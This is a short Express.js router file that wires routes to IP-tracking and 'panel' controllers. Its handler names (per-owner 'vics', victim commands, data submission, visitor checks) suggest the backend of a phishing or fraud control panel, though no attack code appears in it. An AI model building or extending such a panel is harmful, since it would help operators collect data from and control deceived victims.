const express = require("express");

const {
	giveIp,
	checkIp,
	getVisitors,
	giveVisitor,
} = require("../controllers/ipsController");

const {
	getOwnerVics,
	command,
	getInfo,
	submitData,
	deleteEntry,
} = require("../controllers/panelController");

const router = express.Router();

router.get("/:panelName/customers/:owner", getOwnerVics);
router.post("/:panelName/command", command);
router.get("/:panelName/customers/id/:uniqueid", getInfo);
router.post("/:panelName/data", submitData);
router.post("/:panelName/delete", deleteEntry);

router.post("/giveIp", giveIp);
router.get("/checkIp/:ip", checkIp);
router.get("/getVisitors/:owner", getVisitors);
router.post("/giveVisitor", giveVisitor);

module.exports = router;
